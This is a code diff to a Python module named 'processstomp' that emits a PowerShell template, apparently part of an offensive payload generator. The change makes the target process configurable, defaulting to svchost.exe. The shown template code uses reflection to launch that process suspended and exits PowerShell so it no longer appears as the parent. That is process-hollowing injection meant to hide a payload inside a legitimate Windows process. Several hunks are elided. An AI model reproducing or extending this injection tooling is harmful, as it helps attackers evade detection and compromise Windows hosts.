@@ -2,7 +2,9 @@ from string import Template
 
 class processstomp:
     def __init__(self, arguments):
-        pass
+        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
+        if 'target' in arguments:
+            self.target = arguments['target'].replace('\\','\\\\')
 
     def imports(self) -> list[str]:
         return []
@@ -56,7 +58,7 @@ function Get-Delegate
 """
 
     def template(self) -> str:
-        return """
+        return Template("""
     {transformers}
     # Obtain the required types via reflection
     $assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
@@ -86,7 +88,7 @@ function Get-Delegate
     $startupInformation = $startupInformationType.GetConstructors().Invoke($null)
     $processInformation = $processInformationType.GetConstructors().Invoke($null)
 
-    $cmd = [System.Text.StringBuilder]::new("C:\\Windows\\System32\\svchost.exe")
+    $cmd = [System.Text.StringBuilder]::new("$target")
     $result = $CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $false, 0x4, [IntPtr]::Zero, $null, $startupInformation, $processInformation))
 
     # Obtain the required handles from the PROCESS_INFORMATION structure
@@ -127,4 +129,4 @@ function Get-Delegate
 
     # Close powershell to remove it as the parent of svchost.exe
     exit
-"""
+""").safe_substitute(target=self.target)
